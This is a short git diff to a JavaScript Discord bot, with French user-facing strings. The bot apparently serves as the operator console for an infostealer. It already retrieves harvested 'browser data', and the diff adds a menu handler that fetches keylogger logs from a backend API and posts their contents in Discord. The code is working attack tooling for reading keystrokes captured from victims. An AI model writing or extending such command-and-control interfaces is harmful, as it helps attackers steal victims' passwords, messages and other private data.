@@ -57,6 +57,10 @@ client.on('interactionCreate', async interaction => {
         const [browserDataId, filename] = interaction.values[0].split('_');
         const endpoint = `${API_BASE_URL}/browser/data/${browserDataId}`;
         await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
+    } else if (interaction.customId === "select_keylogger") {
+        const [keyloggerDataId, filename] = interaction.values[0].split('_');
+        const endpoint = `${API_BASE_URL}/keylogger/log/${keyloggerDataId}`;
+        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
     }
 
 });
